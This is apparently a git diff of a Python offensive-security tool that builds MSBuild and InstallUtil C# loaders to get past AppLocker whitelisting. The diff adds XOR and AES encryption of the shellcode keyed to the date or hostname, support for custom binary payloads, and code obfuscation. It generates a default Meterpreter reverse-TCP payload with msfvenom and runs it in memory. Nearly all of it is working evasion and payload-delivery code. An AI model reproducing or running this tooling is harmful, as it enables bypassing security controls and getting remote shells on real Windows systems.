@@ -1,4 +1,5 @@
 import string
+import datetime
 import random
 import os
 import sys
@@ -7,9 +8,14 @@ import argparse
 import base64
 import zlib
 
+# To do
+# remove this stuff from global scope
+basefile=""
 infile=""
 outfile=""
-enaobf=True
+encshell=""
+enaobf=""
+password=""
 
 # Framework basepath
 basepath="C:\\Windows\\Microsoft.NET\\Framework\\"
@@ -35,6 +41,17 @@ fakecs=[
 "char a;",
 "string mine"]
 					
+# Shell encoding
+################
+ENCODING='''
+						AesCryptoServiceProvider aes = new AesCryptoServiceProvider();
+						byte[] iv = new byte[16];
+						Buffer.BlockCopy(encoded, 0, iv, 0, 16);
+						byte[] data = new byte[encoded.Length-16];
+						Buffer.BlockCopy(encoded, 16, data, 0, encoded.Length-16);
+						var dec = aes.CreateDecryptor(Encoding.ASCII.GetBytes("TESTXXXXXXXXXXXX"), iv);
+						byte[] final = dec.TransformFinalBlock(data, 0, data.Length);
+'''					
 					
 # Template for MSBuild
 ######################
@@ -49,8 +66,9 @@ MSBUILD='''<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/devel
 			<Using Namespace="System.Reflection" />
 			<Code Type="Class" Language="cs">
 				<![CDATA[
-				using System;					
+				using System;	
 				using System.IO;
+				using System.Text;
 				using Microsoft.Build.Framework;
 				using Microsoft.Build.Utilities;
 				using System.IO.Compression;
@@ -65,6 +83,10 @@ MSBUILD='''<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/devel
 						Console.WriteLine("Started...");
 						__PAYLOAD__
 						byte[] final=Decompress(Convert.FromBase64String(mydata));
+						byte[] password=Encoding.ASCII.GetBytes(__PASSWORD__);
+						if (password.Length!=0)
+							for(int i=0;i<final.Length;i++)
+								final[i]^=password[i%password.Length];
 						processHandle = exec(final);
 						WaitForSingleObject(processHandle, 0xFFFFFFFF);
 						return true;
@@ -169,8 +191,13 @@ namespace Exec
 		{
 			IntPtr processHandle = IntPtr.Zero;	
 			Console.WriteLine("Started...");
-			__PAYLOAD__						
-			processHandle = exec(Decompress(Convert.FromBase64String(mydata)));
+			__PAYLOAD__			
+			byte [] final = Decompress(Convert.FromBase64String(mydata))
+			byte[] password=Encoding.ASCII.GetBytes(__PASSWORD__);
+			if (password.Length!=0)
+				for(int i=0;i<final.Length;i++)
+					final[i]^=password[i%password.Length];			
+			processHandle = exec(final);
 			WaitForSingleObject(processHandle, 0xFFFFFFFF);	
 		}	
 		[DllImport("kernel32")]
@@ -249,10 +276,12 @@ def obfuscatecs(code):
 # - x86/x64 supported
 # - basic obfuscation of c# code
 # - basic obfuscation of shellcode
+# - Client based shellcode encoding (hostname/IP?)
 # TODO:
 # - Better code obuscation of c# code
-# - Client based shellcode encoding (hostanme/IP?)
-def installUtil(fwpath,payload,x64=False):
+# - Better enccryption (AES?)
+def installUtil(fwpath,payload,x64=False):	
+	global basefile
 	global infile
 	global outfile
 	text=obfuscatecs(INSTALLUTIL)
@@ -260,11 +289,10 @@ def installUtil(fwpath,payload,x64=False):
 		text=text.replace("__XTYPE__","ulong")
 	else:
 		text=text.replace("__XTYPE__","UInt32")
-	text=text.replace("__PAYLOAD__",payload)	
-	if (not ".cs" in infile):
-		infile = infile+".cs"	
-	if (not ".exe" in outfile):	
-		outfile = outfile+".exe"
+	text=text.replace("__PAYLOAD__",payload)
+	text=text.replace("__PASSWORD__",password)
+	infile=basefile+".cs"
+	outfile=basefile+".exe"
 	print "Compile command line:"
 	if x64:
 		fwpath=fwpath.replace("Framework","Framework64")
@@ -279,10 +307,12 @@ def installUtil(fwpath,payload,x64=False):
 # - x86/x64 supported
 # - basic obfuscation of c# code
 # - basic obfuscation of shellcode
+# - Client based shellcode encoding (hostname/IP?)
 # TODO:
 # - Better code obuscation of c# code
-# - Client based shellcode encoding (hostanme/IP?)
+# - Better enccryption (AES?)
 def msbuild(fwpath,payload,x64=False):
+	global basefile
 	global infile
 	x=MSBUILD.split("<![CDATA[\n")
 	head=x[0]+"<![CDATA[\n"
@@ -294,9 +324,9 @@ def msbuild(fwpath,payload,x64=False):
 	else:
 		text=text.replace("__XTYPE__","UInt32")
 	text=text.replace("__PAYLOAD__",payload)
-	text=text.replace("__FWPATH__",fwpath)
-	if (not ".csproj" in infile):
-		infile = infile+".csproj"
+	text=text.replace("__PASSWORD__",password)
+	text=text.replace("__FWPATH__",fwpath)	
+	infile = basefile+".csproj"
 	print "Command line:"
 	if x64:
 		print fwpath.replace("Framework","Framework64")+"\\msbuild.exe "+infile
@@ -316,50 +346,101 @@ methods={ 	"msbuild": msbuild,
 
 
 #commandline args
-parser = argparse.ArgumentParser(description='Generates an exe that can take advantage of the InstallUtil whitelist evasion technique.')
-parser.add_argument('--cs_file', dest='inp_name', action='store', default='script')
-parser.add_argument('--exe_file', dest='outp_name', action='store', default='script')
-parser.add_argument('--framework', dest='fwv', action='store', default='2.0')	
-parser.add_argument('--payload', dest='payload', action='store', default='windows/meterpreter/reverse_tcp')
-parser.add_argument('--lhost', dest='lhost', action='store', default='192.168.0.1')
-parser.add_argument('--lport', dest='lport', action='store', default='4444')
-parser.add_argument('--method', dest='method', action='store', default='installUtil')
+parser = argparse.ArgumentParser(description='AppLocker evasion tool')
+parser.add_argument('--output', dest='filename', action='store', default='script', help='Output file name without extension' )
+parser.add_argument('--framework', dest='fwv', action='store', default='2.0', help='Framework NET version')	
+parser.add_argument('--payload', dest='payload', action='store', default=None, help='Payload in MSF syntax')
+parser.add_argument('--lhost', dest='lhost', action='store', default=None, help='Local host for reverse shell')
+parser.add_argument('--lport', dest='lport', action='store', default=None, help='Local port for reverse shell')
+parser.add_argument('--method', dest='method', action='store', default='installUtil', help='Evasion method: msbuild or installUtil')
+parser.add_argument('--enaobf', dest='enaobf', action='store_const', const="True", default=False, help='Enable CS code obfuscation')
+parser.add_argument('--encshell', dest='encshell', action='store', default=None, help='Encode shell with: *date* or hostname')
+parser.add_argument('--custom',dest='custom', action='store', default=None, help='Custom binary payload (don\'t use with --payload/--lhost/--lport')
+parser.add_argument('--x64',dest='x64', action='store_const', const=True, default=False, help='set if your custom payload is x64')
 args=parser.parse_args()
 
-# Set file names
-infile=args.inp_name
-outfile=args.outp_name
+# Arguments checks
+##################
+
+if ("." in basefile):
+	print "Please, remove the extension from the filename"
+	sys.exit()
+	
+basefile=args.filename
 
 if args.fwv not in frameworkversions:
-	print("Please select a correct framework version (1.0, 1.1, 2.0, 3.0 or 4.0)")     # Valutare estensione
+	print("Please select a correct framework version (1.0, 1.1, 2.0, 3.0 or 4.0)")
 	sys.exit()
     
 if args.method not in methods:
-	print("Please select a correct method (msbuild, installUtil)")     # Valutare estensione
+	print("Please select a correct method (msbuild, installUtil)")
 	sys.exit()	
 
-if (not "windows" in args.payload):
-	print "Please choose a windows payload"
+if args.custom!=None and (args.payload!=None or args.lhost!=None or args.lport!=None):
+	print("Cannot use --custom and --payload/--lhost/--lport")
 	sys.exit()
-	
-if ("x64" in args.payload):
-	x64=True
+
+enaobf=args.enaobf
+
+# XOR payload
+if args.encshell!=None:
+	if len(args.encshell)>15:
+		print "Please use *date* or hostname (max 15 chars)"
+		sys.exit()
+	if args.encshell == "*date*":
+		encshell=datetime.datetime.today().strftime('%d%m%Y')
+		password='DateTime.Today.ToString("ddMMyyyy")'
+	else:
+		password='System.Environment.MachineName'
+	def encrypt(data, password):
+		print "Encrypting shellcode with password: "+password
+		ret=""
+		for i in range(len(data)):			
+			ret+=chr(ord(password[i%len(password)]) ^ ord(data[i]))			
+		return ret
 else:
-	x64=False
+	password=""
+	def encrypt(data, password):
+		return data;	
 
-# Details	
+# Print some details	
 print "Framework: "+args.fwv
-print "Connection info: "+args.lhost+":"+args.lport+" ("+args.payload+")"	
-	
-# msfvenom generated payload.  Future revisions may support different payload generation techniques
-print "Generating shellcode using msfvenom..."
-payload = subprocess.check_output(["msfvenom","-p",args.payload,"-f","raw","LHOST="+args.lhost,"LPORT="+args.lport])
+if (enaobf):
+	print "CS obfuscation enabled"
 
-# Obfuscate payload (zlib+base64)
+x64=False
+if args.custom!=None: 
+	print "Loading custom payload"
+	if args.x64:
+		x64=True	
+	with open(args.custom) as f:
+		payload=f.read()
+else:			
+	if (args.payload==None):
+		args.payload='windows/meterpreter/reverse_tcp'
+	if (args.lhost==None):
+		args.lhost='192.168.0.1'
+	if (args.lport==None):
+		args.lport='4444'
+	if (not "windows" in args.payload):
+		print "Please choose a windows payload"
+		sys.exit()		
+	if "x64" in args.payload :
+		x64=True
+	print "Connection info: "+args.lhost+":"+args.lport+" ("+args.payload+")"	
+	print "Generating shellcode using msfvenom..."
+	print "msfvenom","-p",args.payload,"-f","raw","LHOST="+args.lhost,"LPORT="+args.lport
+	payload = subprocess.check_output(["msfvenom","-p",args.payload,"-f","raw","LHOST="+args.lhost,"LPORT="+args.lport])
+
+if (x64):
+	print "Using x64 arch"
+	
+# Obfuscate payload (xor+zlib+base64)
+enc_payload = encrypt(payload,encshell)
 gzip_compress = zlib.compressobj(9, zlib.DEFLATED, zlib.MAX_WBITS | 16)
-gzip_data = gzip_compress.compress(payload) + gzip_compress.flush()
+gzip_data = gzip_compress.compress(enc_payload) + gzip_compress.flush()
 payload = toCString(base64.b64encode(gzip_data))
-print "Obfuscated payload size: %d"%(len(payload))
+print "File size: %d"%(len(payload))
 
 # Set framework path
 fwpath=basepath+frameworkversions[args.fwv]
